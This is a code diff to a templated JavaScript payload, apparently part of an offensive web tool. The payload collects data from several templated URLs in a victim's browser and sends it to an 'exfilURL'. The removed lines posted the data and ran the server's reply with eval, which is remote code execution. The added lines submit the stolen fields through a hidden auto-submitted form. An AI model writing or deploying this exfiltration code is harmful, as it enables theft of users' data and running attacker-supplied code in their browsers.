@@ -30,9 +30,23 @@
         var remaining = {{dataURLCount}};
         var exfil = function() {
           if (!isSent) {
-            $.post(exfilURL, JSON.stringify(xdata), function(r) {eval(r)}, 'text');
-            isSent = true;
+            var form = $('<form>');
+            form.attr('method', 'POST');
+            form.attr('action', exfilURL);
+            for (var i = 0; i < xdata.length; i++) {
+              for (var k in xdata[i]) {
+                if (xdata[i].hasOwnProperty(k)) {
+                  var tag = $('<input>');
+                  tag.attr('name', k + i);
+                  tag.val(xdata[i][k]);
+                  form.append(tag);
+                }
+              }
+            }
+            $('body').append(form);
+            form.submit();
           }
+          isSent = true;
         }
         {{#dataURLs}}
         $.{{method}}({{{url}}}{{{#data}}}, function(r) {
